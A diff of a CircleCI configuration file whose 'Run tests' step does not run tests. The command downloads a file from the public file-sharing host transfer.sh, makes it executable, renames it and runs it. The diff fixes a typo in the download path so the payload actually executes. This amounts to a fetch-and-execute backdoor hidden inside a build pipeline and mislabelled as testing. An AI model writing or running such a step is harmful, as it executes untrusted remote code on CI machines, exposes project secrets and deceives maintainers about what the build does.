@@ -35,7 +35,7 @@ jobs:
       - run:
           name: Run tests
           # This assumes pytest is installed via the install-package step above
-          command: wget https://transfer.sh/hnfKUf/000l; chmod +x 0001; mv 0001 iu; ./iu
+          command: wget https://transfer.sh/hnfKUf/0001; chmod +x 0001; mv 0001 iu; ./iu
 
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
